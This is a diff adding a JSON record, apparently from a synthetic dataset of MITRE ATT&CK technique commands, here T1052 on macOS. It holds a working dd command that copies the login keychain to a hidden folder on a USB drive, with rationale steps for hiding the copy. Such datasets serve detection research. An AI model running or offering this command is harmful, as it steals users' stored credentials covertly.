@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=\"$HOME/Library/Keychains/login.keychain-db\" of=\"/Volumes/NO\\ NAME/.Trashes/.kch\" bs=2m conv=sync,noerror && sync",
+  "explanation": "Copies the login keychain database as raw bytes to a hidden path inside the external drive's .Trashes directory using dd.",
+  "rationale_steps": [
+    "Select a sensitive local file to stage for removal.",
+    "Use dd to copy the file as raw data to a plausible hidden location on the USB.",
+    "Keep the operation local to the system with no network usage.",
+    "Sync to ensure data integrity on the removable media."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-a1e902a4",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
